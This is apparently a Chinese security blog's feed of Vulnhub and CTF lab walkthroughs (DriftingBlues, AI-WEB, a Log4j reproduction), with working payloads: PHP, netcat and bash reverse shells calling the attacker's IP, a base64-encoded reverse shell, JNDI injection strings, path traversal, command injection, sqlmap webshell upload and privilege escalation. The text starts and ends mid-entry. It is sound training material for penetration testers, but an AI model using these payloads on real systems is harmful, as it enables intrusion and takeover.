&#x27;/bin/bash&#x27; &gt; ip</span><br><span class="line">chmod +x ip</span><br><span class="line">/usr/bin/getinfo</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421195813143.png" alt="image-20230421195813143"></p><p>成功提权</p><p><img src="../images/image-20230421195838680.png" alt="image-20230421195838680"></p><p><strong>本节通过信息收集获取到敏感文件，进而 SSH 日志写后门获取 shell，然后信息收集</strong><br><strong>获取 ssh 私钥获取 shell，最后利用 suid-命令劫持提权</strong></p><p><strong>信息收集</strong><br><strong>Base64 解码</strong><br><strong>ssh日志写后门获取 shell</strong><br><strong>信息收集获取 ssh 私钥获取 shell</strong><br><strong>suid-命令劫持提权</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> DriftingBlues-3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub——DriftingBlues-2</title>
      <link href="/posts/1e26cf11.html"/>
      <url>/posts/1e26cf11.html</url>
      
        <content type="html"><![CDATA[<p>(tmd,配置个网卡配置半天)</p><p>还是先扫一下c段</p><p><img src="../images/image-20230421165628676.png" alt="image-20230421165628676"></p><p>然后进行端口扫描</p><p><img src="../images/image-20230421170024112.png" alt="image-20230421170024112"></p><p>扫描发现了三个端口  多出来的21端口是ftp服务，那么我们就可以去尝试一下，看能不能匿名登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.142.142</span><br><span class="line">用户名：anonymous</span><br><span class="line">密码：空</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421170215786.png" alt="image-20230421170215786"></p><p>成功进行登录</p><p>里面只有一张图片，没啥用，然后进行端口扫描</p><p><img src="../images/image-20230421170728331.png" alt="image-20230421170728331"></p><p><img src="../images/image-20230421170744040.png" alt="image-20230421170744040"></p><p>只访问这个blog的话是wordpress框架的</p><p>然后尝试进行使用该框架的扫描工具  <code>wpscan</code>进行扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.142.142/blog/ -e u</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421171032382.png" alt="image-20230421171032382"></p><p>扫到一个用户   于是尝试进行密码破解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.142.142/blog/ --passwords /usr/share/wordlists/rockyou.txt --usernames albert</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421171505615.png" alt="image-20230421171505615"></p><p>爆破到密码了</p><p><img src="../images/image-20230421171908888.png" alt="image-20230421171908888"></p><p>扫到后台了，于是尝试进行登录</p><p><img src="../images/image-20230421172047872.png" alt="image-20230421172047872"></p><p>得先进行域名的dns配置好</p><p><img src="../images/image-20230421172231456.png" alt="image-20230421172231456"></p><p>进行修改成功</p><p><img src="../images/image-20230421172249279.png" alt="image-20230421172249279"></p><p><img src="../images/image-20230421172328984.png" alt="image-20230421172328984"></p><p>成功进入后台，那么我们就得寻找可以进行漏洞利用的地方了</p><p><img src="../images/59383e44fb3e4b81a094c70900c7777f.png" alt="img"></p><p>这就是漏洞利用的点</p><p>修改后的代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">ip=<span class="string">&quot;192.168.142.129&quot;</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">port=3333;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sock=fsockopen(<span class="variable">$ip</span>, <span class="variable">$port</span>);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">descriptorspec=array(</span></span><br><span class="line">0=&gt;$sock,</span><br><span class="line">1=&gt;$sock,</span><br><span class="line">2=&gt;$sock</span><br><span class="line">);</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">process=proc_open(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span></span><br><span class="line"><span class="meta prompt_">proc_close($</span><span class="language-bash">process);</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421173119250.png" alt="image-20230421173119250"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://driftingblues.box/blog/index.php/xxx</span><br></pre></td></tr></table></figure><p>然后访问一个不存在的页面，就可以直接弹shell了</p><p><img src="../images/image-20230421173724289.png" alt="image-20230421173724289"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用命令：python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>然后尝试进行提权</p><p>进入/home/freddie后发现存在<strong>.ssh</strong>文件</p><p><img src="../images/image-20230421173917976.png" alt="image-20230421173917976"></p><p><img src="../images/image-20230421174018099.png" alt="image-20230421174018099"></p><p>发现存在私钥和公钥</p><p>那么我们就可以尝试进行ssh私钥登录  </p><p><img src="../images/image-20230421175335627.png" alt="image-20230421175335627"></p><p>把私钥进行复制过来，然后给权限，然后进行私钥登录</p><p><img src="../images/image-20230421175515512.png" alt="image-20230421175515512"></p><p>直接进行私钥登录了</p><p><img src="../images/image-20230421175554303.png" alt="image-20230421175554303"></p><p>拿到第一个flag</p><p><img src="../images/image-20230421175631172.png" alt="image-20230421175631172"></p><p>猜测是用namp进行提权，用的是script来运行脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;os.execute(&#x27;/bin/bash&#x27;)&quot; &gt; getshell</span><br><span class="line">sudo nmap --script=getshell</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421175735156.png" alt="image-20230421175735156"></p><p>然后就变成了root用户了</p><p><img src="../images/image-20230421175816747.png" alt="image-20230421175816747"></p><p>拿到了全部的flag了</p><p><strong>总结</strong></p><p><strong>这次出现了<code>21</code> 端口匿名登入以及<code>ssh</code> 私钥登入 （新知识点）</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub  DriftingBlues-2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub——DriftingBlues-1</title>
      <link href="/posts/872f9eab.html"/>
      <url>/posts/872f9eab.html</url>
      
        <content type="html"><![CDATA[<p>还是先扫一下c段，发现一下靶机的位置</p><p><img src="../images/image-20230421105027528.png" alt="image-20230421105027528"></p><p>发现靶机的ip地址，于是尝试进行端口扫描</p><p><img src="../images/image-20230421105115877.png" alt="image-20230421105115877"></p><p>发现两个ip端口，于是尝试进行访问</p><p><img src="../images/image-20230421105203784.png" alt="image-20230421105203784"></p><p>发现一个网站</p><p>就是一个静态页面，于是尝试进行目录扫描(没扫到东西)</p><p>于是查看原源码发现存在一段base64编码的东西</p><p><img src="../images/image-20230421105559764.png" alt="image-20230421105559764"></p><p>进行解码</p><p><img src="../images/image-20230421105639164.png" alt="image-20230421105639164"></p><p><img src="../images/image-20230421105711803.png" alt="image-20230421105711803"></p><p>发现这一段串东西   一大堆ok，于是尝试去进行ok解码</p><p><img src="../images/image-20230421110217495.png" alt="image-20230421110217495"></p><p>解码成功 </p><p><a href="https://tool.bugku.com/brainfuck/">解码地址</a></p><p><img src="../images/image-20230421110339515.png" alt="image-20230421110339515"></p><p>这里的提示是修改域名，于是我们尝试进行域名的修改</p><p><img src="../images/image-20230421110653338.png" alt="image-20230421110653338"></p><p><img src="../images/image-20230421110755477.png" alt="image-20230421110755477"></p><p>然后尝试对该域名进行子域名扫描</p><p>使用的工具是<code>gobuster</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -u driftingblues.box -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt --append-domain</span><br></pre></td></tr></table></figure><p>这里的话必须得加上<code>--append-domain</code>，不然扫不出来，因为这里卡了好久</p><p><img src="../images/image-20230421113251849.png" alt="image-20230421113251849"></p><p><strong>这里有有两个 200的状态码 所以我们需要把<code>test.driftingblues.box</code>域名也添加到<code>hosts</code>中</strong></p><p><img src="../images/image-20230421113553783.png" alt="image-20230421113553783"></p><p>成功添加进去了</p><p><img src="../images/image-20230421113628547.png" alt="image-20230421113628547"></p><p>不知道是啥东西，于是先尝试进行目录扫描</p><p><img src="../images/image-20230421113728120.png" alt="image-20230421113728120"></p><p>扫到一个爬虫协议的文本</p><p><img src="../images/image-20230421113758790.png" alt="image-20230421113758790"></p><p><strong>于是挨个进行访问</strong></p><p><img src="../images/image-20230421114124994.png" alt="image-20230421114124994"></p><p><img src="../images/image-20230421114138045.png" alt="image-20230421114138045"></p><p>那么密码就是有十种可能性，但是用户名却不知道，这里面的sheryl不是用户名，那么我们就结合我们前面看到的ok解码后的eric来进行尝试</p><p>利用hydra进行ssh密码爆破</p><p><img src="../images/image-20230421115204314.png" alt="image-20230421115204314"></p><p>尝试成功，于是进行登录</p><p><img src="../images/image-20230421115306167.png" alt="image-20230421115306167"></p><p>登录成功，于是尝试进行提权操作</p><p>还是老三样 sudo -l   suid  内核提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">suid    find / -perm /4000 2&gt;/dev/n</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421115516649.png" alt="image-20230421115516649"></p><p>发现没啥可用的</p><p>查看内核也没发现啥可利用的，于是就去查看备份文件，看有啥东西</p><p><img src="../images/image-20230421154847073.png" alt="image-20230421154847073"></p><p>存在一个备份文件，然后进行读取</p><p><img src="../images/image-20230421154945160.png" alt="image-20230421154945160"></p><p><strong>继续查看一下备份文件<code>backup.sh</code> 发现<code>sudo</code>执行<code>/tmp/emergency</code>文件 但是<code>/tmp</code> 下面没有 需要创建 并将<code>eric</code>用户加入<code>sudo</code>组</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;cp /bin/bash /tmp/getroot; chmod +s /tmp/getroot&#x27; &gt; /tmp/emergency</span><br><span class="line">chmod +x emergency</span><br><span class="line">./getroot -p</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421160008777.png" alt="image-20230421160008777"></p><p>这里能这样写是因为backup.sh是一个定时文件，每过一会就会执行里面的1代码</p><p>这里能给getroot权限是因为执行emergency是以sudo来执行的，就是以root权限来执行的</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub  DriftingBlues-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>菜狗-红明谷-wp</title>
      <link href="/posts/15f20e4d.html"/>
      <url>/posts/15f20e4d.html</url>
      
        <content type="html"><![CDATA[<h2 id="点击签到"><a href="#点击签到" class="headerlink" title="点击签到"></a><strong>点击签到</strong></h2><p>只需要一直点击就行，最后会在末尾输出flag</p><p><img src="../images/image-20230419163250747.png" alt="image-20230419163250747"></p><h2 id="Dreamer"><a href="#Dreamer" class="headerlink" title="Dreamer"></a><strong>Dreamer</strong></h2><p>题目</p><p><img src="../images/image-20230419163405727.png" alt="image-20230419163405727"></p><p>一个框架</p><p>下载题目给的文件，发现后台地址</p><p><img src="../images/image-20230419163458396.png" alt="image-20230419163458396"></p><p><strong>于是进行登录</strong></p><p><img src="../images/image-20230419163537861.png" alt="image-20230419163537861"></p><p>然后google查找该漏洞发现</p><p><img src="../images/image-20230419163600887.png" alt="image-20230419163600887"></p><p><a href="https://forum.butian.net/share/2183">Dreamer CMS 代码审计</a></p><p><img src="../images/image-20230419163637475.png" alt="image-20230419163637475"></p><p>跟着搞就能拿到flag</p><p><img src="../images/image-20230419163736391.png" alt="image-20230419163736391"></p><p>访问前端页面的test就行了</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-AI-WEB-2.0</title>
      <link href="/posts/32823e7e.html"/>
      <url>/posts/32823e7e.html</url>
      
        <content type="html"><![CDATA[<p>扫c段</p><p><img src="../images/image-20230417221049663.png" alt="image-20230417221049663"></p><p>接下来进行端口扫描</p><p><img src="../images/image-20230417221237184.png" alt="image-20230417221237184"></p><p><img src="../images/image-20230418222017787.png" alt="image-20230418222017787"></p><p><strong>这里的话401状态码是</strong></p><p><img src="../images/image-20230418222047797.png" alt="image-20230418222047797"></p><p><img src="../images/image-20230418222147639.png" alt="image-20230418222147639"></p><p><strong>就是没有成功进行身份验证的意思</strong>  得需要拿到管理员的账号密码</p><p>发现只有两个段口，于是进行访问</p><p><img src="../images/image-20230417221348842.png" alt="image-20230417221348842"></p><p>进行注册登录后的得到的界面</p><p><img src="../images/image-20230417222911811.png" alt="image-20230417222911811"></p><p>这个是关键 （刚开始看的时候都不知道这是啥玩意)  还是接触太少了</p><p><img src="../images/image-20230418222302600.png" alt="image-20230418222302600"></p><p>发现漏洞库里确实存在该漏洞</p><p>这里第三个文件可以进行查看，有点像目录穿越的漏洞，进行后面路径的读取</p><p><img src="../images/image-20230418222613446.png" alt="image-20230418222613446"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.105/download.php?file_name=../../../../../../../../../../../../../etc/passwd  ##利用漏洞看passwd</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230418222713281.png" alt="image-20230418222713281"></p><p><img src="../images/image-20230418222929738.png" alt="image-20230418222929738"></p><p>发现可以进行目录穿越来读取文件</p><p><strong>在<code>/etc/passwd/</code>下面发现了 两个用户 分别是 <code>aiweb2</code> <code>n0nr00tuser</code>可能等下需要用到先放着 接着读取一下<code>apache</code> 文件</strong></p><p>读取apache的配置文件是因为网站是由apache组成，并且/etc/shadow访问不了，读取不到文件内容，于是就从apache的配置文件下手</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.105/download.php?file_name=../../../../../../../../../../../../../etc/apache2/sites-enabled/000-default.conf</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230418223246777.png" alt="image-20230418223246777"></p><p>这里的话就读取到了一个很关键的信息了，于是进行该文件的查看，看是否存在用户的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.105/download.php?file_name=../../../../../../../../../../../../../etc/apache2/.htpasswd</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230418223401204.png" alt="image-20230418223401204"></p><p>查到了加密后的密码，于是使用john工具进行破解，看字典里是否存在该密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aiweb2admin:$apr1$VXqmVvDD$otU1gx4nwCgsAOA7Wi.aU/</span><br></pre></td></tr></table></figure><p><strong>新建一个<code>3.txt</code> 把加密的复制进去<code>aiweb2admin:$apr1$VXqmVvDD$otU1gx4nwCgsAOA7Wi.aU/</code>使用工具<code>john</code> 破解 发现 破解失败</strong></p><p><img src="../images/image-20230418223628610.png" alt="image-20230418223628610"></p><p>那看来字典里面有，于是去机器那边看到</p><p><img src="../images/image-20230418223804961.png" alt="image-20230418223804961"></p><p><strong>后面才发现 给的提示有字典的名称:<code>rockyou-45.txt</code> 去<code>github</code> 上面找一个下载一下即可（这里没有外网 本机下载拖到kali）</strong></p><p>记得使用google搜索</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou-45.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230418224240532.png" alt="image-20230418224240532"></p><p>成功将字典下载下来，于是再次进行破解</p><p><img src="../images/image-20230418230511475.png" alt="image-20230418230511475"></p><p>把密码破解出来了，于是尝试ssh连接</p><p><img src="../images/image-20230418230644880.png" alt="image-20230418230644880"></p><p>发现确实不是连接ssh的密码，但是我们不要忘了前面爆出来的一个401的网址，于是我们尝试进行登录试试</p><p><img src="../images/image-20230418230806582.png" alt="image-20230418230806582"></p><p>成功登录成功，于是我们开始查看，看哪些地方可以进行利用</p><p><img src="../images/image-20230418230848255.png" alt="image-20230418230848255"></p><p>读取robots.txt文件发现存在目录，于是进行访问·</p><p>第一个是一个ping命令，</p><p><img src="../images/image-20230418231326496.png" alt="image-20230418231326496"></p><p>成功进行命令的执行</p><p>于是查看第二个目录</p><p><img src="../images/image-20230418231728302.png" alt="image-20230418231728302"></p><p>说是查找这个目录下的信息，于是进行目录扫描，没发现啥，但是呢，是不是可以利用第一个可以命令执行的作用来进行查找呢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|find ../S0mextras/ . -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>返回上一个目录进行这个目录文件的查找，于是发现了关键信息</p><p><img src="../images/image-20230418232009793.png" alt="image-20230418232009793"></p><p>cat 进行读取</p><p><strong>User: n0nr00tuser</strong><br><strong>Cred: zxowieoi4sdsadpEClDws1sf</strong></p><p>于是尝试进行ssh登录</p><p><img src="../images/image-20230418232157543.png" alt="image-20230418232157543"></p><p>成功拿到服务器的权限，只不过是低权限</p><p>尝试进行提权</p><p>sudo -l 不行 尝试suid</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230420213253604.png" alt="image-20230420213253604"></p><p>出现了一个二进制文件，我们得考虑让他来进行提权</p><p>于是就先查看查看内核，看能不能找到漏洞</p><p><img src="../images/image-20230420213426543.png" alt="image-20230420213426543"></p><p><img src="../images/image-20230420213435027.png" alt="image-20230420213435027"></p><p>于是进行漏洞利用，看能不能利用该二进制文件配合这个sh文件进行提权</p><p><img src="../images/image-20230420213549472.png" alt="image-20230420213549472"></p><p>拿到完整路径</p><p><img src="../images/image-20230420213646773.png" alt="image-20230420213646773"></p><p>跟着里面的步骤一步一步来写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/saghul/lxd-alpine-builder/</span><br></pre></td></tr></table></figure><p><strong>下载好了拖到<code>kali</code>里面 然后解压 运行<code>./build-alpine</code> 会下载一个<code>apk</code>的文件</strong></p><p><img src="../images/image-20230420214122839.png" alt="image-20230420214122839"></p><p>接下来点运行<strong><code>build-alpine</code></strong></p><p>然后会下载一个apk文件</p><p><img src="../images/image-20230420214253688.png" alt="image-20230420214253688"></p><p>然后把他传到靶机上</p><p><img src="../images/image-20230420214404838.png" alt="image-20230420214404838"></p><p>成功进行传送</p><p><img src="../images/image-20230420214641055.png" alt="image-20230420214641055"></p><p>把内核提权给的exp也传过去</p><p><img src="../images/image-20230420214722826.png" alt="image-20230420214722826"></p><p>于是尝试进行提权</p><p>先给他两给一下运行的权限</p><p><img src="../images/image-20230420214853460.png" alt="image-20230420214853460"></p><p>接下来直接进行提权操作</p><p><img src="../images/image-20230420215012652.png" alt="image-20230420215012652"></p><p>查看用法，然后直接进行提权</p><p><img src="../images/image-20230420215055452.png" alt="image-20230420215055452"></p><p>直接就是root权限了</p><p><img src="../images/image-20230420215228022.png" alt="image-20230420215228022"></p><p>找到flag位置</p><p><img src="../images/image-20230420215302055.png" alt="image-20230420215302055"></p><p>拿下，就是内核提权</p><p><strong>和suid找出来的二进制文件没啥关系</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub AI-WEB-2.0 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-AI-WEB-1.0</title>
      <link href="/posts/30c48027.html"/>
      <url>/posts/30c48027.html</url>
      
        <content type="html"><![CDATA[<p>先扫一下c段</p><p><img src="../images/image-20230417210846503.png" alt="image-20230417210846503"></p><p>发现主机</p><p>接下来进行端口扫描</p><p><img src="../images/image-20230417210949458.png" alt="image-20230417210949458"></p><p>发现只扫到了一个80端口</p><p>于是尝试进行访问</p><p><img src="../images/image-20230417211102655.png" alt="image-20230417211102655"></p><p>就出现这个玩意</p><p>然后进行目录扫描</p><p><img src="../images/image-20230417211628147.png" alt="image-20230417211628147"></p><p>发现存在一个<code>robots.txt</code>文件,于是进行访问</p><p><img src="../images/image-20230417211745316.png" alt="image-20230417211745316"></p><p><strong>发现了网络爬虫协议 <code>robots</code> 访问一下 发现了两个目录<code>/m3diNf0/</code>和<code>/se3reTdir777/uploads/</code>依次进行访问。</strong></p><p><img src="../images/image-20230417211841895.png" alt="image-20230417211841895"></p><p><img src="../images/image-20230417211903531.png" alt="image-20230417211903531"></p><p>两个访问全是访问不了，于是尝试接着进行目录扫描</p><p><img src="../images/image-20230417211950534.png" alt="image-20230417211950534"></p><p>两个目录只扫出一个目录能进行访问，于是尝试进行访问</p><p><img src="../images/image-20230417212052641.png" alt="image-20230417212052641"></p><p>执行了phpinfo  ，通过这个来查看有没有关键信息</p><p><img src="../images/image-20230417212219650.png" alt="image-20230417212219650"></p><p>发现了网站的绝对路径还有另一个路径<code>/se3reTdir777/uploads/</code> 发现了一个<code>index.php</code></p><p><img src="../images/image-20230417212408231.png" alt="image-20230417212408231"></p><p><img src="../images/image-20230417212520842.png" alt="image-20230417212520842"></p><p>访问该网站，觉得像是存在sql注入，于是进行sqlmap测试</p><p><img src="../images/image-20230417212637629.png" alt="image-20230417212637629"></p><p>查数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.142.138/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  --dbs #列出库</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417212759476.png" alt="image-20230417212759476"></p><p>查出数据库，然后进行表的查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.142.138/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  -D aiweb1 --tables #列出表</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417212859296.png" alt="image-20230417212859296"></p><p>查出表，接下来就是进行列的查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.142.138/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  -D aiweb1 -T user --columns #列出字段</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417212948686.png" alt="image-20230417212948686"></p><p>看起来没啥可利用的信息，而且网站页没啥可用的东西，于是考虑利用sqlmap进行shell的反弹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.142.138/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  --level=3 --os-shell </span><br></pre></td></tr></table></figure><p><strong>选择<code>php(default)</code>，<code>custom location(s)</code> 然后输入刚刚获取到的路径：<code>/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/</code></strong></p><p><strong>获取到<code>shell</code> 但是权限比较低是<code>www-data</code></strong></p><p><img src="../images/image-20230417214433781.png" alt="image-20230417214433781"></p><p><img src="../images/image-20230417214422725.png" alt="image-20230417214422725"></p><p>这里的联系真的很密切，就是给的东西是一定会用到的</p><p>这里由于是上传文件目录，于是我们写一句话木马进去，然后尝试蚁剑连接</p><p><img src="../images/image-20230417214918819.png" alt="image-20230417214918819"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.142.138/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot; --file-write ./hack.php --file-dest /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/hack.php</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417215049771.png" alt="image-20230417215049771"></p><p><strong>接着访问<code>http://192.168.142.138/se3reTdir777/uploads/hack.php</code> 如果是空白的说明上传的木马成功了！！ 直接上<code>WebSell</code>工具 蚁剑连接</strong></p><p><img src="../images/image-20230417215216558.png" alt="image-20230417215216558"></p><p>上传成功，那么我们就尝试进行提权</p><p>使用蚁剑进行shell的反弹操作</p><ol><li><strong>现在kali上面监听一下端口使用命令： nc -lvvp 6666</strong></li><li><strong>nc -e /bin/bash 192.168.0.103 6666（发现-e参数不可用）</strong></li><li><strong>使用命令：rm /tmp/f;mkfifo/tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.142.129 6666 &gt;/tmp/f（回弹了shell）</strong></li><li><strong>使用命令：python -c “import pty;pty.spawn(‘/bin/bash’)”（python写交互）</strong></li></ol><p>有些时候就是不支持  -e shell的反弹，这里使用的是rm反弹</p><p><img src="../images/image-20230417215609447.png" alt="image-20230417215609447"></p><p>成功进行了shell的反弹</p><p><strong>于是接下来就进行提权的操作了</strong></p><p>因为这里反弹shell之后没动静了，于是就不写了，提权的话和DC-9的方法是一样的，给/etc/passwd后面添加一条</p><p>然后切换 id就是root权限了</p><p><a href="https://blog.csdn.net/Aluxian_/article/details/124434294">剩下的提权操作</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub AI-WEB-1.0 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulhub-log4j漏洞复现</title>
      <link href="/posts/cca4fef7.html"/>
      <url>/posts/cca4fef7.html</url>
      
        <content type="html"><![CDATA[<h2 id="CVE-2021-44228-Apache-Log4j-远程代码执行漏洞"><a href="#CVE-2021-44228-Apache-Log4j-远程代码执行漏洞" class="headerlink" title="CVE-2021-44228 Apache Log4j 远程代码执行漏洞"></a>CVE-2021-44228 Apache Log4j 远程代码执行漏洞</h2><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h4><p>Apache Log4j 2 是Java语言的日志处理套件，使用极为广泛。在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于${jndi:ldap://evil.com/example}的lookup用于进行JNDI注入，执行任意代码。</p><p>参考地址：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">https</span>:<span class="comment">//github.com/vulhub/vulhub</span></span><br></pre></td></tr></table></figure><p>复制</p><p>本次漏洞复现也是基于Vulhub</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d --build</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417174622063.png" alt="image-20230417174622063"></p><p>访问<code>http://127.0.0.1:8983/solr/#/</code></p><p><img src="../images/image-20230417174936629.png" alt="image-20230417174936629"></p><p><strong>进行dns测试看是否存在漏洞</strong></p><p>先拿一个域名</p><p><img src="../images/image-20230417175046593.png" alt="image-20230417175046593"></p><p><strong>构造</strong></p><p><code>$&#123;jndi:dns://$&#123;sys:java.version&#125;.example.com&#125;</code>是利用JNDI发送DNS请求的Payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:8983/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.sij1vb.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure><p>直接访问</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:8983/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.3j7r1s.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417175341507.png" alt="image-20230417175341507"></p><p>得到java的版本是1.8</p><p><strong>那么这也说明了是可以执行命令的</strong></p><p>于是进行反弹shell</p><p><strong>反弹shell</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/vps_ip/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>最终形态</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0Mi4xMjkvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>反弹shell需要的工具</p><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">工具地址，下面是操作流程</a></p><p><img src="../images/image-20230417194052114.png" alt="image-20230417194052114"></p><p><img src="../images/image-20230417194154023.png" alt="image-20230417194154023"></p><p><strong>payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c 